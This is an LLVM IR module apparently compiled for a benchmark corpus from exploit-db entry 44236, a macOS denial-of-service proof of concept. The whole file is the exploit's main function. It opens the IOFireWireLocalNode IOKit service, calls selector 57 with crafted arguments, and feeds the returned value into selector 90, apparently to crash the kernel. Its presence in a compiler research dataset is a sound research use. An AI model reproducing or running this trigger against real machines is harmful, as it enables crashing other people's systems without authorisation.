; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_44236.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_44236.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [20 x i8] c"IOFireWireLocalNode\00", align 1
@IO_OBJECT_NULL = common dso_local global i64 0, align 8
@KERN_SUCCESS = common dso_local global i64 0, align 8
@__const.main.args = private unnamed_addr constant [3 x i32] [i32 0, i32 256, i32 256], align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i64, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca [3 x i32], align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  %9 = load i32, i32* @kIOMasterPortDefault, align 4
  %10 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0))
  %11 = call i64 @IOServiceGetMatchingService(i32 %9, i32 %10)
  store i64 %11, i64* %3, align 8
  %12 = load i64, i64* %3, align 8
  %13 = load i64, i64* @IO_OBJECT_NULL, align 8
  %14 = icmp eq i64 %12, %13
  br i1 %14, label %15, label %16

15:                                               ; preds = %0
  store i32 1, i32* %2, align 4
  br label %46

16:                                               ; preds = %0
  %17 = load i64, i64* %3, align 8
  %18 = call i32 (...) @mach_task_self()
  %19 = call i64 @IOServiceOpen(i64 %17, i32 %18, i32 0, i32* %4)
  store i64 %19, i64* %5, align 8
  %20 = load i64, i64* %3, align 8
  %21 = call i32 @IOObjectRelease(i64 %20)
  %22 = load i64, i64* %5, align 8
  %23 = load i64, i64* @KERN_SUCCESS, align 8
  %24 = icmp ne i64 %22, %23
  br i1 %24, label %25, label %26

25:                                               ; preds = %16
  store i32 2, i32* %2, align 4
  br label %46

26:                                               ; preds = %16
  %27 = bitcast [3 x i32]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %27, i8* align 4 bitcast ([3 x i32]* @__const.main.args to i8*), i64 12, i1 false)
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  %28 = load i32, i32* %4, align 4
  %29 = getelementptr inbounds [3 x i32], [3 x i32]* %6, i64 0, i64 0
  %30 = call i64 @IOConnectCallMethod(i32 %28, i32 57, i32* %29, i32 3, i32* null, i32 0, i32* %7, i32* %8, i32* null, i32* null)
  store i64 %30, i64* %5, align 8
  %31 = load i64, i64* %5, align 8
  %32 = load i64, i64* @KERN_SUCCESS, align 8
  %33 = icmp ne i64 %31, %32
  br i1 %33, label %34, label %35

34:                                               ; preds = %26
  store i32 3, i32* %2, align 4
  br label %43

35:                                               ; preds = %26
  %36 = load i32, i32* %4, align 4
  %37 = call i64 @IOConnectCallMethod(i32 %36, i32 90, i32* %7, i32 1, i32* null, i32 0, i32* null, i32* null, i32* null, i32* null)
  store i64 %37, i64* %5, align 8
  %38 = load i64, i64* %5, align 8
  %39 = load i64, i64* @KERN_SUCCESS, align 8
  %40 = icmp ne i64 %38, %39
  br i1 %40, label %41, label %42

41:                                               ; preds = %35
  store i32 4, i32* %2, align 4
  br label %43

42:                                               ; preds = %35
  br label %43

43:                                               ; preds = %42, %41, %34
  %44 = load i32, i32* %4, align 4
  %45 = call i32 @IOServiceClose(i32 %44)
  br label %46

46:                                               ; preds = %43, %25, %15
  %47 = load i32, i32* %2, align 4
  ret i32 %47
}

declare dso_local i64 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i64 @IOServiceOpen(i64, i32, i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @IOObjectRelease(i64) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i64 @IOConnectCallMethod(i32, i32, i32*, i32, i32*, i32, i32*, i32*, i32*, i32*) #1

declare dso_local i32 @IOServiceClose(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
